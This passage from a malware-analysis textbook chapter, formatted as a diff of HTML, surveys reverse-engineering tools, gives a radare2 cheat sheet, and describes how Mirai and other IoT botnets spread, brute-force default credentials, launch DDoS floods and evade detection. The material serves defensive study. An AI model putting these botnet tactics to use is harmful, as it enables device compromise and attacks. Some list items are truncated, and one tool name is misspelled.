+				<li><strong class="bold">ODA</strong>: This is a unique <strong class="bold">online disassembler</strong>; it provides basic disassembler functionality, as well as some neat dialog windows, for example, to provide a list of functions or strings. It supports an impressive number of architectures, as we can see in the following figure:</li>
+			</ul>
+			<div><div><img src="img/Figure_11.10_B18500.jpg" alt="Figure 11.10 – A list of architectures supported by ODA&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11<a id="_idTextAnchor1250"/>.10 – A list of architectures supported by ODA</p>
+			<ul>
+				<li><strong class="bold">radare2</strong>: This is a <a id="_idIndexMarker1689"/>powerful framework combining multiple<a id="_idIndexMarker1690"/> features to facilitate both static and dynamic analysis, and it also supports multiple architectures. Many engineers treat it as a proper open source alternative to IDA; it even supports FLIRT signatures in addition to its own <strong class="bold">zignatures</strong>, which can be used similarly. Apart from the console, it also has two graphics modes, including control flow graphs. While it takes time to master some of the hotkeys that are used, it helps to drastically speed up analysis. We will dive deeper into how to use it within a dedicated section, <em class="italic">A radare2 cheat sheet</em>, shortly.</li>
+				<li><strong class="bold">RetDec</strong>: This decompiler supports multiple file formats, platforms, and architectures, and includes <a id="_idIndexMarker1691"/>multiple other <a id="_idIndexMarker1692"/>features, such as compiler and packer detection, as well as recognition of statically linked library code.</li>
+				<li><strong class="bold">Snowman</strong>: This is another powerful <a id="_idIndexMarker1693"/>decompiler that supports multiple file formats and architectures. It can be use<a id="_idTextAnchor1251"/>d in the forms of both plugins and standalone tools.</li>
+				<li><strong class="bold">Ghidra</strong>: A powerful cross-platform, open <a id="_idIndexMarker1694"/>source reverse-engineering toolkit focused on static analysis – it was released to the public by the NSA in March 2019. It supports an impressive number of architectures and corresponding instruction sets, as well as multiple file formats (in both the disassembler and decompiler). It features a comprehensive GUI with the ability to work on multiple files simultaneously in separate tabs. In addition, it has built-in functionality for creating scripts and collaborative work, as well as program diffing and version tracking:</li>
+			</ul>
+			<div><div><img src="img/Figure_11.11_B18500.jpg" alt="Figure 11.11 – The multiple analysis options in Ghidra&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.11 – The multiple analysis options in Ghidra</p>
+			<ul>
+				<li><strong class="bold">Relyze</strong> (commercial and demo versions available): A relatively new player on the market, it supports <a id="_idIndexMarker1695"/>both PE and ELF files <a id="_idIndexMarker1696"/>for x86, x64, and ARM architectures. It has multiple modern features, such as control flow graphs, function analysis and references, and strong visualization functionality.</li>
+				<li><strong class="bold">Binary Ninja</strong> (commercial and <a id="_idIndexMarker1697"/>demo versions available): This is a strong cross-platform reversing platform that introduced multiple advanced features, such as multi-threaded analysis.</li>
+				<li><strong class="bold">Hopper</strong> (commercial and demo versions available): Originally developed for Mac, it now supports both <a id="_idIndexMarker1698"/>Windows and Linux systems as well. Among other features, it also provides decompiling capabilities.</li>
+				<li><strong class="bold">IDA</strong> (commercial – both demo and <a id="_idIndexMarker1699"/>free versions are available): This is one of the most powerful and, at the same time, easy-to-use solutions available on the market. The number of supported architectures and file formats is daunting, and the rich functionality can be <a id="_idIndexMarker1700"/>further extended with the help of plugins and scripts. The associated <strong class="bold">Hex-Rays Decompiler</strong> runs on multiple platforms and can handle assembly <a id="_idIndexMarker1701"/>for x86, x64, ARM32, ARM64, and PowerPC processors.</li>
+			</ul>
+			<p>This is definitely not an exhaustiv<a id="_idTextAnchor1252"/>e list, and the number of such tools keeps growing, which gives engineers<a id="_idTextAnchor1253"/> the ability to find the one that suits their needs best.</p>
+			<h3>Frameworks</h3>
+			<p>These libraries are supposed to be used to develop other tools, or to just solve some particular engineering task, using a <a id="_idIndexMarker1702"/>custom script to call them:</p>
+			<ul>
+				<li><strong class="bold">Capstorm</strong>: This is a lightweight <a id="_idIndexMarker1703"/>multi-platform disassembly engine that supports multiple architectures, including x86, ARM, MIPS, PowerPC, SPARC, and several others. It provides native support for Windows and multiple *nix systems. It is designed so that other developers can build reverse-engineering tools based on it. Be<a id="_idTextAnchor1254"/>sides the C language, it also provides Python and Java APIs.</li>
+				<li><strong class="bold">distorm3</strong>: This is a disassembler<a id="_idIndexMarker1704"/> library for processing x86 or AMD binary streams. Written in C, it also has wrappers in Python, Ruby, and Java.</li>
+				<li><strong class="bold">Vivisect</strong>: This is a Python-based <a id="_idIndexMarker1705"/>framework for static and dynamic analysis that supports, among others, PE, ELF, Mach-O, and Blob binary formats on various architectures. It has multiple convenient features, such as program flow graphs, syntax highlighting, and support for cross-references.</li>
+				<li><strong class="bold">Miasm</strong>: This is a reverse-engineering <a id="_idIndexMarker1706"/>framework in Python and it supports several architectures. Among<a id="_idIndexMarker1707"/> its interesting features are intermediate representations, so-called emulation using <strong class="bold">Just-In-Time</strong> (<strong class="bold">JIT</strong>) compilation, symbolic execution, and an expression simplifier.</li>
+				<li><strong class="bold">angr</strong>: This Python library is a <a id="_idIndexMarker1708"/>binary analysis framework that supports multiple architectures. It has multiple interesting features, including control flow analysis, decompilation capabilities, and its probably most widely used feature: symbolic execution.</li>
+				<li><strong class="bold">Metasm</strong>: This Ruby-based engine is a<a id="_idIndexMarker1709"/> cross-architecture framework that includes an [dis]assembler, [de]compiler, and file structure manipulation functionality. At the <a id="_idIndexMarker1710"/>moment, multiple architectures including x86, MIPS, and PowerPC are supported. The o<a id="_idTextAnchor1255"/>riginal official website looks outdated, but the GitHub project is still alive.</li>
+			</ul>
+			<p>With a big list of players on this market, the analyst may have an understandable question – which<a id="_idTextAnchor1256"/> solution is the best? Let’s try to answer this question together.</p>
+			<h3>How to choose</h3>
+			<p>A tool should always be chosen <a id="_idIndexMarker1711"/>according to the relevant task and prior knowledge. If the purpose is to understand the functionality of a small shellcode, then even standard tools such as <code>objdump</code> may be good enough. Otherwise, it generally makes sense to master more powerful all-in-one solutions that support either multiple architectures or the main architecture of interest. While the learning curve in this case will be much steeper, this knowledge can later be re-applied to handle new tasks and eventually can save an impressive amount of time. The ability to do both static and dynamic analysis in one place would definitely be an advantage as well.</p>
+			<p>Open source solutions nowadays provide a pretty decent alternative to the commercial ones, so ultimately, the decision should be made by the engineer. If money doesn’t matter, then it makes sense to try several of them; check which one has the better interface, documentation, and community; and eventually, stick to the most comfortable solution.</p>
+			<p>Finally, if you are a developer aiming to automate a certain task (for example, building a custom malware monitoring system for IOC extraction), then it makes sense to have a look at open source<a id="_idTextAnchor1257"/><a id="_idTextAnchor1258"/> engines and modules that can drastically speed up the development.</p>
+			<h2 id="_idParaDest-363"><a id="_idTextAnchor1259"/>Dynamic analysis</h2>
+			<p>It always makes sense to debug<a id="_idIndexMarker1712"/> malicious code in an isolated safe environment that is easy to reset back to the previous state. For these purposes, engineers generally use <strong class="bold">virtual machines</strong> (<strong class="bold">VMs</strong>) or dedi<a id="_idTextAnchor1260"/>cated physical <a id="_idIndexMarker1713"/>machines with software that allows quick restoration.</p>
+			<h3>Tracers</h3>
+			<p>These tools can be used to<a id="_idIndexMarker1714"/> monitor malware actions that are performed on the testing system:</p>
+			<ul>
+				<li><code>ptrace</code> call to inspect and manipulate the internal state of the target process.</li>
+			</ul>
+			<div><div><img src="img/Figure_11.12_B18500.jpg" alt="Figure 11.12 – Analyzing malware using a strace tool&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.12 – Analyzing malware using a strace tool</p>
+			<ul>
+				<li><strong class="bold">ltrace</strong>: Thi<a id="_idTextAnchor1261"/>s is another <a id="_idIndexMarker1716"/>debugging utility that displays calls that an application makes to libraries and syscalls.</li>
+				<li><strong class="bold">Frida</strong>: This is a dynamic instrumentation toolkit that aims to be used by both security researchers and <a id="_idIndexMarker1717"/>developers. It allows script injection and the consequent alteration and tracing of target processes, with no source code needed.</li>
+			</ul>
+			<p>It is always worth keeping in mind that behavioral analysis techniques generally produce limited results and, in most cases, should be care<a id="_idTextAnchor1262"/>fully used together with static analysis to understand the full picture.</p>
+			<h3>Network monitors</h3>
+			<p>These tools intercept network traffic, which<a id="_idIndexMarker1718"/> can give the analyst valuable insight into malware behavior:</p>
+			<ul>
+				<li><strong class="bold">tcpdump</strong>: A standard tool to <a id="_idIndexMarker1719"/>dump and analyze the network traffic</li>
+				<li><strong class="bold">wireshark or tshark</strong>: A free network <a id="_idIndexMarker1720"/>protocol analyzer with the ability to record network traffic as well</li>
+			</ul>
+			<p>The recorded network traffic can <a id="_idTextAnchor1263"/>be shared between multiple engineers to speed up the analysis if necessary.</p>
+			<h3>Debuggers</h3>
+			<p>Debuggers provide more<a id="_idIndexMarker1721"/> control over the execution process and can also be used to tamper and extract data on the fly:</p>
+			<ul>
+				<li><code>gdbinit</code> syntax highlighter configuration file:</li>
+			</ul>
+			<div><div><img src="img/Figure_11.13_B18500.jpg" alt="Figure 11.13 – Stopping at the entry point in GDB and disassembling the instructions there&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.13 <a id="_idTextAnchor1264"/>– Stopping at the entry point in GDB and disassembling the instructions there</p>
+			<ul>
+				<li><strong class="bold">IDA</strong>: IDA is shipped with several so-called <a id="_idIndexMarker1723"/>debugging server utilities that can be executed on the required platform and be used for remote debugging (in this case, the IDA itself can<a id="_idIndexMarker1724"/> run on a different machine). For Linux samples, IDA supports x86 (32- and 64-bit) and ARM (32-bit) architectures.</li>
+				<li><code>radare2</code> provides plenty of options for dynamic analysis, and is accompanied by a UI that supports multiple output <a id="_idIndexMarker1726"/>modes. A project called <strong class="bold">Cutter</strong> that provides a more mouse-friendly <a id="_idIndexMarker1727"/>GUI is based on its fork, called <strong class="bold">rizin</strong>.</li>
+				<li><code>vivisect</code> can be used for both static and dynamic analy<a id="_idTextAnchor1265"/>sis, as well as <a id="_idIndexMarker1728"/>a framework to au<a id="_idTextAnchor1266"/>tomate multiple tasks with the help of scripting.</li>
+			</ul>
+			<p>Now, let’s talk about emulators.</p>
+			<h3>Binary emulators</h3>
+			<p>This software can be used to emulate instructions of the samples without actually executing them directly on the testing machine. It can be extremely useful when analyzing malware that’s <a id="_idIndexMarker1729"/>been compiled for a platform that’s different from the one being used for analysis:</p>
+			<ul>
+				<li><strong class="bold">libemu</strong>: This is a small emulator <a id="_idIndexMarker1730"/>library that supports the x86 ISA. It’s shipped with a small tool, <strong class="bold">sctest</strong>, which prints the emulation state.</li>
+				<li><code>-g</code> argument can be used to specify the port for running the GDB server with the requested tool. This way, it becomes possible to connect to it using various debuggers (see the following examples).</li>
+				<li><strong class="bold">Unicorn</strong>: This is a <a id="_idIndexMarker1732"/>powerful QEMU-based cross-platform CPU emulation engine, and it supports multiple architectures, including x86, ARM, MIPS, SPARC, and PowerPC:</li>
+			</ul>
+			<div><div><img src="img/Figure_11.14_B18500.jpg" alt="Figure 11.14 – An example of the Unicorn-based code used to emulate the shellcode&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.14 – An example of the Unicorn-based code used to emulate the shellcode</p>
+			<ul>
+				<li><strong class="bold">Qiling</strong>: An advanced binary<a id="_idIndexMarker1733"/> emulation framework supporting tons of architectures and associated executable file formats, based on the Unicorn engine.</li>
+			</ul>
+			<p>Finally, a<a id="_idTextAnchor1267"/><a id="_idTextAnchor1268"/><a id="_idTextAnchor1269"/>s an<a id="_idIndexMarker1734"/> example, let’s talk about how to use <code>radare2</code> for both static and dynamic analysis.</p>
+			<h2 id="_idParaDest-364"><a id="_idTextAnchor1270"/>A radare2 cheat sheet</h2>
+			<p>Many first-time users<a id="_idIndexMarker1735"/> struggle with using <code>radare2</code> because of the impressive number of commands and hotkeys supported. However, there is no need to use it as an analog for GDB. <code>radare2</code> features very convenient graphical interfaces that can be used similarly to IDA or other high-end commercial tools. In addition, multiple third-party UIs are available. To begin with, to enable debugging, the sample should be opened with the <code>-d</code> command-line argument, as in the following example:</p>
+			<pre>r2 -d sample.bin</pre>
+			<p>Here is a list of some of the most common commands supported (all the commands are case-sensitive):</p>
+			<ul>
+				<li><code>:</code> key).</li>
+				<li><code>?</code>: Shows the help. Detailed<a id="_idIndexMarker1737"/> information about some particular command (and all commands with this prefix) can be obtained by entering it followed by the <code>?</code> sign, for example, <code>dc?</code>.</li><li><code>?*~...</code>: This allows easy interactive navigation through all the help commands. The last three dots should be typed as they are, not replaced with anything.</li><li><code>ie</code>: Lists the available entry points.</li><li><code>iS</code>: Lists sections.</li><li><code>aa/aaa/aaaa</code>: Analyzes functions with various levels of detail.</li><li><code>afl</code>: Lists functions (requires the <code>aa</code> command to be executed first).</li><li><code>iz/izz</code>: List the strings in data sections (usually, the <code>.rodata</code> section) and in the whole binary (which often produces l<a id="_idTextAnchor1271"/>ots of garbage), respectively.</li><li><code>ii</code>: Lists the imports<a id="_idIndexMarker1738"/> that are available.</li><li><code>is</code>: Lists symbols.</li></ul></li>
+				<li><code>dc</code>: Continues execution.</li><li><code>dcr</code>, <code>dcs</code>, or <code>dcf</code>: Continues execution up until <code>ret</code>, <code>syscall</code>, or <code>fork</code>, respectively.</li><li><code>ds</code> or <code>dso</code>: Steps in or over.</li><li><code>dsi</code>: Continues until a condition matches, for example, <code>dsi eax==5,ebx&gt;0</code>.</li></ul></li>
+				<li><code>db</code>: Lists the breakpoints (without an argument) or sets a breakpoint (with an address as an argument).</li><li><code>db-</code>, <code>dbd</code>, or <code>dbe</code>: Removes, disables, and enables the breakpoint, respectively.</li><li><code>dbi</code>, <code>dbid</code>, or <code>dbie</code>: Lists, disables, and enables breakpoints, but using their indices in a list this time; this saves time, as it is no longer required to type the corresponding addresses.</li><li><code>drx</code>: Modifies hardware breakpoints.</li></ul></li>
+				<li><code>dr</code>: Displays registers or<a id="_idIndexMarker1741"/> changes the value of a specified one.</li><li><code>/</code>, <code>/w</code>, <code>/x</code>, <code>/e</code>, or <code>/a</code>: Searches for a specified string, wide string, <code>hex</code> string, regular expression, or assembly opcode, respectively (check <code>/?</code> for more options).</li><li><code>px</code> or <code>pd</code>: Prints a <code>hexdump</code> or a disassembly, respectively, for example, <code>pd 5 @eip</code> to print five disassembly lines at the current program counter.</li><li><code>w</code> or <code>wa</code>: Writes a string or an opcode, respectively, to the address specified with the <code>@</code> prefix.</li></ul></li>
+				<li><code>afn<a id="_idTextAnchor1272"/></code>: Renames a function.</li><li><code>afvn</code>: Renames the argument or local variable.</li><li><code>CC</code>: Lists or edits comments.</li></ul></li>
+				<li><code>;</code>: A separator for commands that allows you to chain them to sequences.</li><li><code>|</code>: Pipes the command output to shell commands.</li><li><code>~</code>: Uses <code>grep</code>, for example, <code>f~abc</code> and <code>f|grep abc</code> will pretty much do the same job</li></ul></li>
+			</ul>
+			<div><div><img src="img/Figure_11.15_B18500.jpg" alt="Figure 11.15 – An example of the commands supported by radare2&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.15 – An example of the commands supported by radare2</p>
+			<p><code>V</code> command:</p>
+			<ul>
+				<li><code>?</code>: Help.</li><li><code>V</code>: Enters graph mode (especially useful for those used to it in IDA).</li><li><code>!</code>: Enters visual panel mode. It only supports a limited set of hotkeys.</li><li><code>q</code>: Returns to the previous visual mode or shell.</li><li><code>p/P</code>: Switches forward and backward between print modes, such as <em class="italic">hex</em>, <em class="italic">disasm</em>, or <em class="italic">debug</em>.</li><li><code>/</code>: Highlights specified values.</li><li><code>:</code>: Enters a generic command.</li></ul></li>
+				<li><code>.</code>: Seeks to the program counter (current instruction).</li><li><code>1-9</code>: Follows the jump or call with the corresponding shortcut number in a comment (the numbering always starts from the top of the displayed area).</li><li><code>c</code>: Enables or disables cursor mode, which allows more detailed navigation. In the debug print mode, it is possible to move the cursor between windows using the <code>Tab</code> key.</li><li><code>Enter</code>: Follows the<a id="_idIndexMarker1745"/> jump or call, either on the top-displayed instruction or at the current location of the cursor.</li><li><code>o</code>: Seeks to the specified offset. Recent versions of <code>radare2</code> use the <code>g</code> key instead.</li><li><code>u</code> or <code>U</code>: Undoes or redoes the seek.</li><li><code>x</code> or <code>X</code>: Searches for cross-references and references, respectively, and optionally seeks there.</li><li><code>b</code>: Displays lists of entries such as functions, comments, symbols, xrefs, flags (strings, sections, imports), and navigates to particular values using the <code>Enter</code> key.</li></ul></li>
+				<li><code>F2</code> or <code>FB</code>: Sets a breakpoint</li><li><code>F7</code> or <code>Fs</code>: Takes a single step</li><li><code>F8</code> or <code>FS</code>: Steps over</li><li><code>F9</code>: Continues execution</li></ul></li>
+				<li><code>SHIFT</code> + <code>h/j/k/l</code> or <code>arrows</code>: Selects the block (in the cursor mode) and then does one of the following:<ul><li><code>y</code>: Copies the selected block</li><li><code>Y</code>: Pastes the copied block</li><li><code>i</code>: Changes the block to the hex data specified</li><li><code>a</code> or <code>A</code>: Changes the block to the assembly instruction(s) specified</li></ul></li></ul></li>
+				<li><code>F</code> or <code>f-</code>: Sets or unsets flags (names for selected addresses).</li><li><code>d</code>: This supports multiple operations, such as renaming functions, and defining the block as data, code, and functions.</li><li><code>;</code>: Sets a comment.</li></ul></li>
+			</ul>
+			<p>Here is how debugging using <code>radare2</code>’s visual mode will look:</p>
+			<div><div><img src="img/Figure_11.16_B18500.jpg" alt="Figure 11.16 – Staying at the entry point of malware in radare2 using its visual mode&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.16 – Staying at the entry point of malware in radare2 using its visual mode</p>
+			<p>Many engineers prefer to start the debugging process by running the <code>aaa</code> command (or using the <code>–A</code> command-line option) in order to analyze functions and then switch to visual mode and continue working there, but it depends on personal preference:</p>
+			<div><div><img src="img/Figure_11.17_B18500.jpg" alt="Figure 11.17 – Running an aaa command in radare2 before starting the actual analysis&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.17 – Running an aaa command in radare2 before starting the actual analysis</p>
+			<p>Now, it is time to apply<a id="_idIndexMarker1747"/> all th<a id="_idTextAnchor1273"/>is knowledge and dive deep into the internals of one of the most notorious IoT malware families – Mirai.</p>
+			<h1 id="_idParaDest-365"><a id="_idTextAnchor1274"/>Learning about Mirai, its clones, and more</h1>
+			<p>For many years, the Windows <a id="_idIndexMarker1748"/>platform was the main target of attackers because it was the most common desktop OS. This means that many beginner malware developers had it at home to experiment with, and many organizations used it on the desktops of non-IT personnel, for example, accountants that had access to financial transactions, or maybe diplomats that had access to some high-profile confidential information.</p>
+			<p>As far as this is concerned, the Mirai (meaning <em class="italic">future</em> in Japanese) malware fully deserved its notoriety, as it opened a door to a new, previously largely unexplored area for malware – the IoT. While it wasn’t the first malware to leverage it (other botnets, such as Qbot, were known a long time before), the scale of its activity clearly showed everybody how hardcoded credentials such as <em class="italic">root/123456</em> on largely ignored smart devices could now represent a really serious threat when thousands of compromised appliances suddenly start DDoS attacks against benign organizations across the world. To make things worse, the author of Mirai released its source code to the public, which led to th<a id="_idTextAnchor1275"/>e appearance of multiple clones in a short time. Here is the structure of the released project:</p>
+			<div><div><img src="img/Figure_11.18_B18500.jpg" alt="Figure 11.18 – An example of the Mirai source code available on GitHub&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.18 – An example of the Mirai source code availabl<a id="_idTextAnchor1276"/>e on GitHub</p>
+			<p>In this section, we<a id="_idIndexMarker1749"/> will put our o<a id="_idTextAnchor1277"/>btained knowledge into practice and become familiar with behavioral patterns used by this malware.</p>
+			<h2 id="_idParaDest-366"><a id="_idTextAnchor1278"/>High-level functionality</h2>
+			<p>Luckily for reverse engineers, the malware<a id="_idIndexMarker1750"/> author provided a good description <a id="_idTextAnchor1279"/>of the malware functionality, accompanied by the source<a id="_idTextAnchor1280"/> code, and even corrected some mistakes that were made by the engineers who previously analyzed it.</p>
+			<h3>Propagation</h3>
+			<p>The bot scans IP addresses, which are<a id="_idIndexMarker1751"/> selected pseudo-randomly with certain ranges excluded, asynchronously using TCP SYN packets, in order to find target candidates with open default Telnet ports first. Here is how it<a id="_idTextAnchor1281"/> looks in the source code:</p>
+			<div><div><img src="img/Figure_11.19_B18500.jpg" alt="Figure 11.19 – Mirai malware excluding several IP ranges from scanning&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.19 – Mirai malware excluding several IP ranges from scanning</p>
+			<p>Then, malware brute-forces access to the found candidate machines using pairs of hardcoded credentials. The successful results are passed to the server to balance the load, and all data is stored in a database. The server then activates a loader module that verifies the system and <a id="_idIndexMarker1752"/>delivers the bot payload using either the <code>wget</code> or <code>tftp</code> tool if available; otherwise, it uses a tiny embedded downloader. The malware has several pre-compiled binary payloads for several different architectures (ARM, MIPS, SPARC, SuperH, Powe<a id="_idTextAnchor1282"/>rPC, and <a id="_idTextAnchor1283"/>m68k). After this, the cycle repeats, and the just-deployed bots continue searching for new victims.</p>
+			<h3>Weaponry</h3>
+			<p>The main purpose of this <a id="_idIndexMarker1753"/>malware is to organize DDoS attacks on demand. Several types of attacking techniques are supported, including the following:</p>
+			<ul>
+				<li>A UDP flood </li>
+				<li>A SYN flood </li>
+				<li>An ACK flood </li>
+				<li>A GRE flood </li>
+				<li>An HTTP flood </li>
+				<li>A DNS flood</li>
+			</ul>
+			<p>Here is a snippet of Mirai’s source code mentioning them:</p>
+			<div><div><img src="img/Figure_11.20_B18500.jpg" alt="Figure 11.20 – The diﬀerent attack vectors of Mirai malware&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.20 – The diﬀerent attack vectors of Mirai malware</p>
+			<p>As we can see here, the<a id="_idIndexMarker1754"/> authors implemen<a id="_idTextAnchor1284"/><a id="_idTextAnchor1285"/>ted multiple options so that they could select the most efficient attack against a particular victim.</p>
+			<h3>Self-defense</h3>
+			<p>The original Mirai doesn’t survive the<a id="_idIndexMarker1755"/> reboot. Instead, the malware kills the software associated with Telnet, SSH, and HTTP ports in order to prevent other malware from entering the same way, as well as to block legitimate remote administration activity. Doing this complicates the remediation procedure. It also tries to kill rival bots such as Qbot and Wifatch if found on the same device.</p>
+			<p>Beyond this, the malware hides its process name using the <code>prctl</code> system call with the <code>PR_SET_NAME</code> argument, and uses <code>chroot</code> to change the root directory and avoid detection <a id="_idTextAnchor1286"/>by this artifact. In addition, both hardcoded credentials and the <a id="_idTextAnchor1287"/>actual C&amp;C address are encrypted, so they won’t appear in plain text among the strings that were used.</p>
+			<h2 id="_idParaDest-367"><a id="_idTextAnchor1288"/>Later derivatives</h2>
+			<p>At first, it is worth noting that <a id="_idIndexMarker1756"/>not all Mirai modifications end up with a publicly known unique name; often, many of them fall under the same generic Mirai category. An example would be the Mirai variant that, in November 2016, propagated using the RCE attack against DSL modems via TCP port <code>7547</code> (<code>TR-069/CWMP</code>).</p>
+			<p>Here are some other examples of known botnets that borrowed parts of the Mirai source code:</p>
+			<ul>
+				<li><strong class="bold">Satori</strong> (meaning <em class="italic">comprehension</em> or <em class="italic">understanding</em> in Japanese): This exploits vulnerabilities for propagation, for<a id="_idIndexMarker1757"/> example, CVE-2018-10562 to target GPON routers or CVE-2018-10088 to target Xiongmai software.</li>
+				<li><strong class="bold">Masuta or PureMasuta</strong> (meaning <em class="italic">master</em> in Japanese): This <a id="_idIndexMarker1758"/>exploits a bug in the D-Link HNAP, apparently linked to the Satori creator(s).</li>
+				<li><strong class="bold">Okiru</strong> (meaning <em class="italic">to get up</em> in Japanese): This uses its own configurations and exploits for propagation (CVE-2014-8361 targeting <a id="_idIndexMarker1759"/>a Realtek SDK and CVE-2017-17215 targeting Huawei routers). It has added support for ARC processors.</li>
+				<li><strong class="bold">Owari</strong> and <strong class="bold">Sora</strong> (meaning <em class="italic">the end</em> and <em class="italic">the sky</em> in Japanese, respectively): These are two projects that<a id="_idIndexMarker1760"/> were linked to the same author, known under the <a id="_idIndexMarker1761"/>nickname Wicked. Originally used for credential brute-forcing for propagation, Owari was later upgraded with several exploits, for example, CVE-2017-17215.</li>
+			</ul>
+			<p>Other botnets exist<a id="_idTextAnchor1289"/>, and often some independent malware also uses pieces of Mirai source code, which can mix up the attribution. There are multiple modifications that different actors incorporate into their clones, including the following:</p>
+			<ul>
+				<li><strong class="bold">Improved IP ranges to skip</strong>: Some malware families ignore IP ranges belonging to big VPS providers where many researchers host their honeypots.</li>
+				<li><strong class="bold">Extended lists of hardcoded credentials</strong>: Attackers keep exploring new devices and adding extracted credentials to their lists, or even make them updatable.</li>
+				<li><strong class="bold">More targeted protocols</strong>: Apart from Telnet, modern Mirai clones also target many other services, such as TR-069, and don’t mind using exploits.</li>
+				<li><strong class="bold">New attack vectors</strong>: The list of payloads ha<a id="_idTextAnchor1290"/>s been extended over time as well.</li>
+				<li><strong class="bold">Added persistence mechanisms</strong>: Some clones added persistence techniques to survive both<a id="_idTextAnchor1291"/> the usual reboot and basic remediation procedures.</li>
+			</ul>
+			<p>Now, let’s talk about other famous IoT malware families.</p>
+			<h2 id="_idParaDest-368"><a id="_idTextAnchor1292"/>Other widespread families</h2>
+			<p>While Mirai became extremely<a id="_idIndexMarker1762"/> famous due to the scale of the attacks performed, multiple other independent projects existed before and after it. Some of them incorporated pieces of Mirai’s code later in order to extend their functionality.</p>
+			<p>Here are some of the most notorious IoT malware families and the approximate years when they became known to the general public. All of them can be roughly split into two categories.</p>
+			<p>The following category consists of malware that actually aims to harm:</p>
+			<ul>
+				<li><strong class="bold">TheMoon</strong> (~2014): Originally propagated through vulnerabilities in Linksys routers, it later extended <a id="_idIndexMarker1763"/>support to other devices, for example, ASUS through CVE-2014-9583. Starting as a DDoS botnet, it was extended with new modules. For example, it later started providing proxy functionality.</li>
+				<li><strong class="bold">Lightaidra</strong> (~2014): It propagates by <a id="_idIndexMarker1764"/>brute-forcing credentials, communicates with the C&amp;C via IRC, and performs DDoS attacks. The source code is publicly available.</li>
+				<li><strong class="bold">Qbot/BASHLITE/Gafgyt/LizardStresser/Torlus</strong> (~2014): The original version appeared in 2014, was propagated via Shellshock vulnerability, and aime<a id="_idTextAnchor1293"/>d to be used for DDoS attacks. The source code was leaked in 2015, which led to the creation of multiple clones.</li>
+				<li><strong class="bold">Tsunami/Kaiten</strong> (evolved drastically over the years): This is<a id="_idIndexMarker1765"/> one more DDoS malware family with a Japanese name (<em class="italic">kaiten</em> meaning <em class="italic">rotation</em>) that also uses the no-longer-so-popular IRC protocol to communicate with the C&amp;C. Apart from hardcoded credentials, it also actively explores new propagation methods, including exploits.</li>
+				<li><strong class="bold">LuaBot</strong> (~2016): This is a <a id="_idIndexMarker1766"/>DDoS botnet written in Lua and it propagates mainly using known vulnerabilities.</li>
+				<li><strong class="bold">Imeij</strong> (~2017): Another DDoS-oriented <a id="_idIndexMarker1767"/>malware, this propagates through a CGI vulnerability and focuses on AVTech CCTV equipment.</li>
+				<li><strong class="bold">Persirai</strong> (~2017): This <a id="_idIndexMarker1768"/>mainly focuses on cameras, accessing them via a web interface. It specializes in DDoS attacks.</li>
+				<li><strong class="bold">Reaper/IoTroop</strong> (~2017): This botnet <a id="_idIndexMarker1769"/>became infamous for exploiting at least nine known vulnerabilities against various devices, and it shares some of its code base with Mirai.</li>
+				<li><strong class="bold">Torii</strong> (~2018): It got its <a id="_idIndexMarker1770"/>name because the first recorded hits were coming from Tor nodes. Torii is a Japanese word for the gate at the entrance of a shrine. It allegedly focuses on data exfiltration, incorporating several persistence<a id="_idIndexMarker1771"/> and anti-reverse-engineering techniques. Since the FTP credentials that were used to communicate with the C&amp;C were hardcoded, researchers immediately got access to its backend, including logs.</li>
+				<li><strong class="bold">Muhstik</strong> (~2018): In addition<a id="_idIndexMarker1772"/> to DDoS attacks, this botnet is also specializing in cryptocurrency mining.</li>
+				<li><strong class="bold">Echobot</strong> (~2019): Targeting more than 50 different vulnerabilities, this Mirai successor went much further than<a id="_idIndexMarker1773"/> just using different filenames for the delivered modules commonly found in its clones.</li>
+				<li><strong class="bold">Mozi</strong> (~2019): Based on the DHT<a id="_idIndexMarker1774"/> protocol for building its own P2P network, this botnet utilizes parts of multiple botnets whose source code was leaked before, coupled with the original code:</li>
+			</ul>
+			<div><div><img src="img/Figure_11.21_B18500.jpg" alt="Figure 11.21 – Some of the public DHT servers misused by Mozi malware&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.21 – Some of the public DHT servers misused by Mozi malware</p>
+			<ul>
+				<li><strong class="bold">Dark Nexus</strong> (~2020): Specializing<a id="_idIndexMarker1775"/> mainly in DDoS attacks, this botnet features a unique scoring system in an attempt to efficiently kill competitor samples.</li>
+				<li><strong class="bold">Meris</strong> (~2021): This botnet <a id="_idIndexMarker1776"/>became famous for launching an attack against Brian Krebs’s website that far exceeded the one originally performed by Mirai.</li>
+				<li><strong class="bold">BotenaGo</strong> (~2021): Unlike<a id="_idIndexMarker1777"/> many other IoT malware families, this one is written in Go language and is shipped with a few dozen exploits. Similar to Mirai, its source code is now <a id="_idIndexMarker1778"/>available to the public on Github.</li>
+			</ul>
+			<p>Then, there’s malware whose author’s intent was allegedly to make the world a better place. Examples of such families include the following:</p>
+			<ul>
+				<li><strong class="bold">Carna</strong> (~2012): The author’s aim was to measure the extent of the internet before it became too<a id="_idIndexMarker1779"/> complicated with the adoption of the IPv6 protocol.</li>
+				<li><strong class="bold">Wifatch</strong> (~2014): This is an<a id="_idIndexMarker1780"/> open source malware that attempts to secure devices. Once penetration is successful, it removes known malware and disables Telnet access, leaving a message for the owners to update them.</li>
